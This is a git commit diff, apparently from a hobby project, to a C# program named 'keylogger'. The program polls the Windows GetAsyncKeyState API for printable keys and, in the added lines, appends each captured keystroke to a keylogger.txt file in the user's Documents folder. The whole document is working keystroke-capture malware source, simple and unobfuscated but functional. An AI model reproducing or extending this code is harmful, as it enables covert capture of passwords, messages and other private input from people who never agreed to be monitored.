a84dda641876e4dfa0a17af10d62b12eec4f2d9f
Михаил Любачев <liubachev@live.ru>
2020-02-09 19:08:36 +0300

    first

--- keylogger/Program.cs
+++ keylogger/Program.cs
@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Runtime.InteropServices;
 using System.Threading;
 
@@ -6,24 +7,49 @@ namespace keylogger
 {
     class Program
     {
-
+        
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
         static string keyLog = "";
         static void Main(string[] args)
         {
+            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+
+            if (!Directory.Exists(filepath))
+            {
+                Directory.CreateDirectory(filepath); 
+            }
+
+            string path = (filepath + @"\keylogger.txt");
+             
+            if (!File.Exists(path ))
+            {
+                using (StreamWriter sw = File.CreateText(path))
+                { 
+                
+                }
+            }
+
+
             while (true)
             {
-                Thread.Sleep(5);
+                Thread.Sleep(50);
                 for (int i = 32; i < 127; i++)
                 {
                     int keyState = GetAsyncKeyState(i);
                     if (keyState == 32768)
                     {
+
                         Console.Write((char)i + " ");
+                        using (StreamWriter sw = File.AppendText(path))
+                        { 
+                            sw.Write((char)i); 
+                        }
+                     
+                              
                     }
-                }
+                } 
             }
         }
     }
